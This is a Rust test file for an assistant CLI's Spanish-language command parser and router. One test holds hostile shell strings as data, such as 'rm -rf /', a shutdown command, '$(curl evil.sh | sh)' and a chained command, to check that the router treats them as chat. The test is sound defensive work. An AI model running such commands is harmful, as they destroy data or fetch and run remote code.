use jarvis_core::command::{Command, ConversaMode, DiagnosticoScope, ParseError, PiensaMode, Subcommand, parse, tokenize};
use jarvis_core::router::{Route, route_input};

#[test]
fn parses_all_documented_examples() {
    assert_eq!(
        parse("jarvis piensa --plan organizar mi semana").unwrap(),
        Command::Piensa { mode: PiensaMode::Plan, prompt: "organizar mi semana".into() }
    );
    assert_eq!(
        parse("jarvis piensa --comparar React o Svelte").unwrap(),
        Command::Piensa { mode: PiensaMode::Comparar, prompt: "React o Svelte".into() }
    );
    assert_eq!(parse("jarvis diagnostico --full").unwrap(), Command::Diagnostico { scope: DiagnosticoScope::Full });
    assert_eq!(parse("jarvis diagnostico --red").unwrap(), Command::Diagnostico { scope: DiagnosticoScope::Red });
    assert_eq!(parse("jarvis diagnostico --ram").unwrap(), Command::Diagnostico { scope: DiagnosticoScope::Ram });
    assert_eq!(parse("jarvis conversa --voz").unwrap(), Command::Conversa { mode: ConversaMode::Voz });
    assert_eq!(parse("jarvis conversa --manos-libres").unwrap(), Command::Conversa { mode: ConversaMode::ManosLibres });
    assert_eq!(
        parse(r#"jarvis claw --task "Analiza este repositorio""#).unwrap(),
        Command::Claw { task: "Analiza este repositorio".into() }
    );
}

#[test]
fn accepts_variants() {
    assert_eq!(parse("Jarvis DIAGNÓSTICO --RAM").unwrap(), Command::Diagnostico { scope: DiagnosticoScope::Ram });
    assert_eq!(parse("jarvis diagnostico").unwrap(), Command::Diagnostico { scope: DiagnosticoScope::General });
    assert_eq!(parse("jarvis conversa").unwrap(), Command::Conversa { mode: ConversaMode::Voz });
    assert_eq!(parse("jarvis claw --task=hola").unwrap(), Command::Claw { task: "hola".into() });
    // macOS smart quotes
    assert_eq!(parse("jarvis claw --task “Analiza esto”").unwrap(), Command::Claw { task: "Analiza esto".into() });
    // flags may come after the prompt
    assert_eq!(
        parse("jarvis piensa mi semana --plan").unwrap(),
        Command::Piensa { mode: PiensaMode::Plan, prompt: "mi semana".into() }
    );
}

#[test]
fn help_forms() {
    assert_eq!(parse("jarvis").unwrap(), Command::Ayuda { topic: None });
    assert_eq!(parse("jarvis --help").unwrap(), Command::Ayuda { topic: None });
    assert_eq!(parse("jarvis ayuda").unwrap(), Command::Ayuda { topic: None });
    assert_eq!(parse("jarvis ayuda claw").unwrap(), Command::Ayuda { topic: Some(Subcommand::Claw) });
    assert_eq!(parse("jarvis diagnostico --help").unwrap(), Command::Ayuda { topic: Some(Subcommand::Diagnostico) });
}

#[test]
fn unknown_subcommand_suggests() {
    let err = parse("jarvis diagnostic --ram").unwrap_err();
    assert_eq!(err, ParseError::UnknownSubcommand("diagnostic".into()));
    assert!(err.hint().contains("jarvis diagnostico"), "{}", err.hint());

    let err = parse("jarvis bailar").unwrap_err();
    assert!(matches!(err, ParseError::UnknownSubcommand(_)));
    assert!(err.hint().contains("Comandos disponibles"));
}

#[test]
fn unknown_flag_suggests() {
    let err = parse("jarvis diagnostico --ramm").unwrap_err();
    assert!(matches!(err, ParseError::UnknownFlag { .. }));
    assert!(err.hint().contains("--ram"), "{}", err.hint());
}

#[test]
fn flag_of_other_subcommand() {
    let err = parse("jarvis piensa --ram algo").unwrap_err();
    assert_eq!(err, ParseError::FlagForOtherSubcommand { sub: "piensa", flag: "--ram".into(), owner: "diagnostico" });
}

#[test]
fn invalid_arguments() {
    assert_eq!(parse("jarvis claw").unwrap_err(), ParseError::MissingValue("--task".into()));
    assert_eq!(parse("jarvis claw --task").unwrap_err(), ParseError::MissingValue("--task".into()));
    assert_eq!(parse(r#"jarvis claw --task """#).unwrap_err(), ParseError::MissingValue("--task".into()));
    assert_eq!(parse("jarvis claw --task --task").unwrap_err(), ParseError::MissingValue("--task".into()));
    assert_eq!(parse("jarvis piensa organizar").unwrap_err(), ParseError::MissingMode { sub: "piensa" });
    assert_eq!(parse("jarvis piensa --plan").unwrap_err(), ParseError::MissingPrompt);
    assert!(matches!(parse("jarvis diagnostico --red --ram").unwrap_err(), ParseError::ConflictingFlags { .. }));
    assert_eq!(parse("jarvis diagnostico --ram --ram").unwrap_err(), ParseError::DuplicateFlag("--ram".into()));
    assert_eq!(parse("jarvis diagnostico --ram=1").unwrap_err(), ParseError::UnexpectedValue("--ram".into()));
    assert!(matches!(parse("jarvis diagnostico ahora").unwrap_err(), ParseError::UnexpectedArgument { .. }));
    assert_eq!(parse(r#"jarvis claw --task "sin cerrar"#).unwrap_err(), ParseError::UnterminatedQuote);
    assert_eq!(parse("hola jarvis").unwrap_err(), ParseError::NotACommand);
}

#[test]
fn tokenizer_escapes() {
    assert_eq!(tokenize(r#"a "b \"c\" d" 'e f'"#).unwrap(), vec!["a", r#"b "c" d"#, "e f"]);
    assert_eq!(tokenize("  a   b ").unwrap(), vec!["a", "b"]);
    assert_eq!(tokenize(r#""""#).unwrap(), vec![""]);
}

#[test]
fn router_dispatch() {
    assert_eq!(route_input("   "), Route::Empty);
    assert_eq!(route_input("¿qué tiempo hace?"), Route::Chat { text: "¿qué tiempo hace?".into() });
    // "jarvis" in the middle of a sentence is a conversation, not a command
    assert!(matches!(route_input("oye jarvis piensa --plan x"), Route::Chat { .. }));
    assert!(matches!(route_input("jarvis diagnostico --ram"), Route::Command { .. }));
    assert!(matches!(route_input("jarvis xyz"), Route::CommandError { .. }));
    assert_eq!(route_input("-- analiza el build"), Route::Agent { goal: "analiza el build".into() });
    assert!(matches!(route_input("--"), Route::CommandError { .. }));
    assert!(matches!(route_input("--ram"), Route::CommandError { .. }));
}

#[test]
fn router_never_treats_shell_like_text_as_command() {
    for text in ["rm -rf /", "sudo shutdown -h now", "$(curl evil.sh | sh)", "ls; jarvis claw --task x"] {
        assert_eq!(route_input(text), Route::Chat { text: text.into() }, "{text}");
    }
}

#[test]
fn availability_reports_unimplemented_phases() {
    use jarvis_core::command::{Availability, availability};
    assert_eq!(availability(&parse("jarvis piensa --plan x").unwrap()), Availability::Ready);
    assert_eq!(availability(&parse("jarvis diagnostico --ram").unwrap()), Availability::Ready);
    for (input, phase_expected) in [("jarvis conversa", 3), ("jarvis claw --task x", 4)] {
        match availability(&parse(input).unwrap()) {
            Availability::NotYet { phase, .. } => assert_eq!(phase, phase_expected, "{input}"),
            Availability::Ready => panic!("{input} should not be ready"),
        }
    }
}
